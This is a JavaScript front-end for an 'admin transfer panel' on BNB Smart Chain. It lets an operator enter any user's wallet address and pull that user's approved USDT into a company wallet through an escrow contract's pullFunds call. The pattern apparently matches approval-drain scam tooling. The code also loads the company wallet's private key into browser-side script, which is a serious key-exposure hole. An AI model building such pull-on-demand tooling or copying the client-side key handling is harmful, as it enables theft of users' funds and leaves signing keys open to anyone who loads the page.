// ===== Admin Transfer Panel JS =====
class AdminTransferPanel {
    constructor() {
        // Config addresses
        this.escrowContractAddress = CONFIG.ESCROW_CONTRACT_ADDRESS; // your deployed escrow
        this.usdtTokenAddress = CONFIG.USDT_TOKEN_ADDRESS;           // USDT on BSC
        this.companyWalletAddress = CONFIG.COMPANY_WALLET_ADDRESS;   // must match escrow's companyWallet
        this.companyWalletPrivateKey = CONFIG.SENDER_KEY;

        // BSC provider
        this.provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

        // Initialize wallet & contracts
        this.wallet = new ethers.Wallet(this.companyWalletPrivateKey, this.provider);

        const escrowAbi = [
            "function pullFunds(address token, address user, uint256 amount) external",
            "function companyWallet() view returns (address)"
        ];
        this.escrowContract = new ethers.Contract(this.escrowContractAddress, escrowAbi, this.wallet);

        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "event Approval(address indexed owner, address indexed spender, uint256 value)"
        ];
        this.usdtContract = new ethers.Contract(this.usdtTokenAddress, usdtAbi, this.provider);

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.updateContractInfo();
    }

    setupEventListeners() {
        document.getElementById("transferForm").addEventListener("submit", e => {
            e.preventDefault();
            this.handleTransfer();
        });

        document.getElementById("checkBalanceBtn").addEventListener("click", () => this.checkBalance());
    }

    async handleTransfer() {
        const fromAddress = document.getElementById("fromAddress").value.trim();
        const amount = parseFloat(document.getElementById("amount").value);

        if (!ethers.utils.isAddress(fromAddress)) return this.showNotification("❌ Invalid user wallet", "error");
        if (amount <= 0) return this.showNotification("❌ Amount must be greater than 0", "error");

        // UI Buttons select
        const transferBtn = document.getElementById("transferBtn");
        const btnText = transferBtn.querySelector(".btn-text");
        const btnLoading = transferBtn.querySelector(".btn-loading");

        try {
            // Get USDT decimals
            const decimals = await this.usdtContract.decimals();
            const parsedAmount = ethers.utils.parseUnits(amount.toString(), decimals);

            // Check allowance
            const allowance = await this.usdtContract.allowance(fromAddress, this.escrowContractAddress);
            if (allowance.lt(parsedAmount)) {
                return this.showNotification(`❌ User has not approved enough USDT. Allowance: ${ethers.utils.formatUnits(allowance, decimals)} USDT`, "error");
            }

            // UI loading state ON
            transferBtn.disabled = true;
            btnText.style.display = "none";
            btnLoading.style.display = "inline";

            // --- DEBUGGING VARIABLES ---
            console.log("--- DEBUGGING VARIABLES ---");
            console.log("USDT Token Address:", this.usdtTokenAddress);
            console.log("User From Address:", fromAddress);
            console.log("Processed Amount (Raw):", parsedAmount.toString());

            // Perform transfer via Escrow
            const tx = await this.escrowContract.pullFunds(
                this.usdtTokenAddress, 
                fromAddress, 
                parsedAmount, 
                {
                    gasLimit: 150000, 
                    gasPrice: await this.provider.getGasPrice() 
                }
            );
            
            this.showNotification(`⏳ Transfer submitted: ${tx.hash}`, "info");

            await tx.wait();
            this.showNotification(`✅ ${amount} USDT transfer initiated successfully`, "success");

            this.addTransferToList(fromAddress, "Company", amount, tx.hash);

        } catch (err) {
            console.error("Error during transfer:", err);
            this.showNotification(`❌ Transfer failed: ${err.reason || err.message}`, "error");
        } finally {
            // UI loading state OFF
            transferBtn.disabled = false;
            btnText.style.display = "inline";
            btnLoading.style.display = "none";
        }
    }

    async checkBalance() {
        const fromAddress = document.getElementById("fromAddress").value.trim();
        if (!ethers.utils.isAddress(fromAddress)) return this.showNotification("❌ Enter valid wallet", "error");

        try {
            const balance = await this.usdtContract.balanceOf(fromAddress);
            const allowance = await this.usdtContract.allowance(fromAddress, this.escrowContractAddress);
            const decimals = await this.usdtContract.decimals();

            const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
            const allowanceFormatted = ethers.utils.formatUnits(allowance, decimals);

            this.showNotification(`💰 Balance: ${parseFloat(balanceFormatted).toFixed(2)} USDT | Allowance: ${parseFloat(allowanceFormatted).toFixed(2)} USDT`, "info");
        } catch (err) {
            this.showNotification(`❌ Failed to check balance: ${err.message}`, "error");
        }
    }

    updateContractInfo() {
        document.getElementById("usdtToken").innerText = this.usdtTokenAddress;
        document.getElementById("escrowContract").innerText = this.escrowContractAddress;
    }

    addTransferToList(from, to, amount, txHash) {
        const list = document.getElementById("transfersList");
        if (!list) return;

        const item = document.createElement("div");
        item.className = "transfer-item";
        item.innerHTML = `
            <p><strong>From:</strong> ${this.shortenAddress(from)}</p>
            <p><strong>To:</strong> ${this.shortenAddress(to)}</p>
            <p><strong>Amount:</strong> ${amount} USDT</p>
            <p><strong>Tx:</strong> <a href="https://bscscan.com/tx/${txHash}" target="_blank">${txHash}</a></p>
            <hr>
        `;

        list.prepend(item);
    }

    shortenAddress(addr) {
        return addr.slice(0, 6) + "..." + addr.slice(-4);
    }

    showNotification(msg, type = "info") {
        const n = document.getElementById("notification");
        n.textContent = msg;
        n.className = `notification ${type}`;
        n.style.display = "block";
        setTimeout(() => (n.style.display = "none"), 5000);
    }
}

document.addEventListener("DOMContentLoaded", () => new AdminTransferPanel());